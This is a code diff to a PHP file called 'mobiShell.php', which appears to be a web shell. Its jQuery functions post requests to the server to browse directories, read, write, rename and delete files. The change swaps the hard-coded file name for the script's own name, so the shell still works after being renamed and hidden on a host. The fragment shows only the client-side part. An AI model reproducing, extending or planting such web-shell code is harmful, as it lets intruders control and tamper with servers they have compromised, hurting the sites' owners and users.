@@ -315,11 +315,15 @@ if (isset($_POST['deletefile']))
     <![endif]-->
     <script src="https://ijazurrahim.com/js/jquery-3.2.1.min.js"></script>
 	    <script>
-    	function changedir(a)
+		function fName(){
+			var cfName = '<?php echo basename($_SERVER['PHP_SELF']); ?>';
+			return cfName;
+		}
+    		function changedir(a)
 		{
 			var dir = a;
 			$(".loading").show(1000);
-			$.post('mobiShell.php',
+			$.post(fName(),
 			 {dir: dir},
 			 function(data) {
 				$(".loading").hide(1000);
@@ -335,7 +339,7 @@ if (isset($_POST['deletefile']))
 			var filecontent = $('textarea').val();
 			var filepath = c;
 			$(".loading").show(1000);
-			$.post('mobiShell.php',
+			$.post(fName(),
 			 {filename: filename,filecontent:filecontent,filepath:filepath},
 			 function(data) {
 			 	if (data==1) {
@@ -358,7 +362,7 @@ if (isset($_POST['deletefile']))
 			var file = b;
 			$(".loading").show(1000);
 			$(".editor").empty();
-			$.post('mobiShell.php',
+			$.post(fName(),
 			 {file: file},
 			 function(data) {
 				$(".loading").hide(1000);
@@ -418,7 +422,7 @@ if (isset($_POST['deletefile']))
 			var oldname = $(".path").text()+"/"+$(".newname").text();
 			var newname = $(".path").text()+"/"+$(".oldname").text();
 			$(".loading").show(1000);
-			$.post('mobiShell.php',
+			$.post(fName(),
 			 {oldname: oldname,newname:newname},
 			 function(data) {
 			 	if(data==1)
@@ -451,7 +455,7 @@ if (isset($_POST['deletefile']))
 			$(".confirm-delete").addClass('hidden');
 			var deletefile = $(".filepath").text();
 			$(".loading").show(1000);
-			$.post('mobiShell.php',
+			$.post(fName(),
 			 {deletefile: deletefile},
 			 function(data) {
 			$(".loading").hide(1000);
